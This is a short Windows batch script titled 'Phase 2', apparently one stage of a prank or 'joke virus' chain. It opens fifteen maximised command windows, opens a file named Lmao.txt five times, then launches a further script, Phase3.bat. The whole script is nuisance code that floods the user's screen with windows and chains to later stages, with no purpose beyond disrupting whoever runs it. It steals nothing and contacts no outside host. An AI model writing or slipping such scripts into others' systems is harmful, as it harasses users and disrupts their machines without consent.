@echo OFF
title [ Phase 2 ]

for /l %%x in (1, 1, 15) do (
   start /max cmd
)

cd ..\..\..\ > NUL
for /l %%x in (1, 1, 5) do (
   start \SRC\Data\Cache\Lmao.txt
)
start \SRC\Batch\Functions\Phase3.bat


pause > NUL